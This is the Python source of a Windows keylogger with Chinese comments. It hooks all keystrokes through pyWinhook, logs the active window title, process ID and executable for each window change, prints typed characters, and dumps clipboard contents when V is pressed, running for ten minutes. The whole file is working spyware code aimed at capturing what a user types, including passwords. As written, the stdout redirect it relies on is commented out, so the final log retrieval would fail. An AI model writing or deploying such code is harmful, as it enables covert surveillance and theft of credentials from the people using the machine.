#-*- coding : utf-8-*-
# coding:utf-8
from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10


class Keylogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        """
        抓取活跃窗口和相应的进程ID
        :return:
        """
        # 抓取当前活跃的窗口
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        # 获取进程对应的ID
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        # 找到进程的文件名
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        window_title = create_string_buffer(512)
        # 抓取窗口标题栏的文本
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode('GBK')
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknow')

        print('\n', process_id, executable.value.decode('GBK'), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()

        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')

        return True


def run():
    # save_stdout = sys.stdout
    # sys.stdout = StringIO()

    kl = Keylogger()
    # 创建管理器
    hm = pyHook.HookManager()
    # 监听键盘,将keydown事件绑定到回调函数
    hm.KeyDown = kl.mykeystroke
    # 钩住所有按键事件
    hm.HookKeyboard()

    while time.thread_time() < TIMEOUT:
        # 循环监听
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    # sys.stdout = save_stdout

    return log


if __name__ == '__main__':
    print(run())
    print('done.')


